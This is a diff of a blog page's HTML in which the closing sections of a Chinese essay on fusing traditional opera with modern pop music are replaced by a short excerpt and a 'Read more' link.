-<h2 id="将流行歌曲和戏曲相交融的意义"><a href="#将流行歌曲和戏曲相交融的意义" class="headerlink" title="将流行歌曲和戏曲相交融的意义"></a>将流行歌曲和戏曲相交融的意义</h2><h3 id="促进戏曲文化的传播"><a href="#促进戏曲文化的传播" class="headerlink" title="促进戏曲文化的传播"></a>促进戏曲文化的传播</h3><p>随着时代的变迁，传统的戏曲文化已经逐渐被当代的年轻人所淡忘，取而代之的是流行音乐在人们的生活中被广泛传播。为了能够延续戏曲文化的传承，当代的音乐艺人有必要对音乐形式进行革新，将戏曲元素融入到当代的流行音乐当中，扩大戏曲文化的传播范围。</p>
-<h3 id="在流音乐当中渗透传统文化"><a href="#在流音乐当中渗透传统文化" class="headerlink" title="在流音乐当中渗透传统文化"></a>在流音乐当中渗透传统文化</h3><p>在经济全球化的大背景下，各国之间贸易往来越来越频繁，民族文化在此过程中得到了广泛的传播。在当代的流行音乐当中渗透戏曲元素，改变了“中国流行音乐一味借鉴西方音乐文化，与中华传统音乐文化失之交臂”这一现象，是我国在文化交流的过程中占据了主动地位。总的来说，各种艺术之间是相通的，尤其是在戏曲文化与现代流行音乐之间，虽然存在着时代性的差异，但是只要经过不断地探索，就一定能将二者融合。</p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>现阶段，流行音乐是发展迅速，这是因为流行音乐比较符合当下比较快的社会节奏，是能适应社会的艺术作品，它不仅能考虑到受众的审美口味，还能丰富人们的艺术修养，更能满足年轻一代的情感体验。就在青少年追崇时尚，离中国传统文化艺术越来越远的时候，流行音乐与戏曲元素结合这种形式的出现不仅能增强青少年对传统艺术的热爱，同时还能让青少年感受民族传统戏曲所带来的艺术享受。这也让中国传统文化艺术得到了良好的传播。</p>
-<p>而古代戏曲，由于欣赏门槛较高，受众范围较小，渐渐式微。但是随着各种戏曲行业的从业人员的努力，比如王珮瑜在抖音发起的“我要笑出‘国粹范’”，展示京剧生旦净丑各行当独特的笑声，收获26亿次播放，这些都是戏剧文化与时代文化相交融的很好的例子。而要将现代流行音乐和古代戏曲相结合，还需要相关从业人员提高自己能力以及业务水平，在两头都硬的情况下才能创作出好的“戏歌”。</p>
-
-          
+          浅谈古代戏曲与现代流行音乐的交融内容摘要：笔者想起这个话题是因为前段时间听歌时恰巧听到一首国外的作曲
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/04/16/%E6%B5%85%E8%B0%88%E5%8F%A4%E4%BB%A3%E6%88%8F%E6%9B%B2%E4%B8%8E%E7%8E%B0%E4%BB%A3%E6%B5%81%E8%A1%8C%E9%9F%B3%E4%B9%90%E7%9A%84%E4%BA%A4%E8%9E%8D/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
